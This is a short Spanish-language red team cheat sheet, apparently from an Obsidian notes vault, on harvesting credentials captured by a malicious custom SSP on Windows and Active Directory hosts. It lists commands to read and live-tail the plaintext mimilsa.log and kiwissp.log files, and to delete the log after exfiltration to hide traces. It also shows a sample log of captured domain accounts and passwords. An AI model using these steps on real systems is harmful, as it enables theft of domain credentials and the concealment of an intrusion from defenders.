---
aliases:
  - Custom SSP Collection
tags:
  - technique/credential-access
  - asset/active-directory
  - env/windows
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Active Directory]]"
tertiary categories:
  - "[[Active Directory Explotación]]"
kind: SubCheatSheet
linked:
  - "[[Custom SSP]]"
---
# Custom SSP - Recolección

> El SSP malicioso escribe cada credencial capturada en un log local en texto plano.

---

## Leer las Credenciales Capturadas

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `type C:\Windows\System32\mimilsa.log` | Credenciales capturadas por `memssp` (texto plano) | Tras inyección en memoria. |
| `type C:\Windows\System32\kiwissp.log` | Log de `mimilib` (variante en disco) | Tras inyección persistente. |
| `Get-Content C:\Windows\System32\mimilsa.log -Wait` | Tail en vivo de las capturas | Monitoreo continuo. |
| `del C:\Windows\System32\mimilsa.log` (tras exfil) | Limpieza del rastro | OPSEC post-recolección. |
^cssp-collect-read

### Formato del log

```text
[00000000:000abc12] corp.local\administrator    SuperS3cret!
[00000000:000def34] corp.local\svc_sql          ServiceP@ss
```

> [!tip] Qué captura
> Cada **login interactivo o de servicio** posterior a la inyección. En un DC, prácticamente toda autenticación que pase por el host → cosecha continua de credenciales frescas (incluye cuentas que nunca dumpearías).
